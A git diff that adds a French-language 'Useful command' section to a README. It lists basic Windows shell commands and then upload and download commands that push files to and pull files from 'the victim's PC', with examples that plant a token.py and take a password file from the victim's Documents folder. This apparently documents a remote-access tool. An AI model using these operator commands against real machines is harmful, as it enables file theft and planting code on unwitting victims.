@@ -63,6 +63,20 @@ Contact :
 
 ---
 
+## 🎭 Useful command
+
+```
+- echo %cd% ||| Equivalent à 'pwd' sur Unix pour savoir dans quelle dossier vous êtes
+- cd .. && mkdir reverse ||| '&&' Permet d'éxécuter une commande puis une autre, exemple 'cd ..' permet d'aller un dossier en arrière puis créer un dossier
+- type file.txt ||| Equivalent à 'cat' sur Unix pour voir le contenue d'un fichier texte
+- echo "salut" >> salut.txt ||| Permet d'écrire "salut" dans un fichier qui va etre appellé "salut.txt"
+
+- upload [Chemin d'accès] ||| Permet d'envoyer un fichier sur le pc de la victime (Exemple: upload C:\Users\Miro\Desktop\token.py)
+- download [Chemin d'accès] ||| Permet de récupérer un fichier du pc de la victime (Exemple: download C:\Users\Victime\Documents\motdepasse.txt)
+```
+
+---
+
 ## 📋 License
 
 This project is licensed under the MIT License
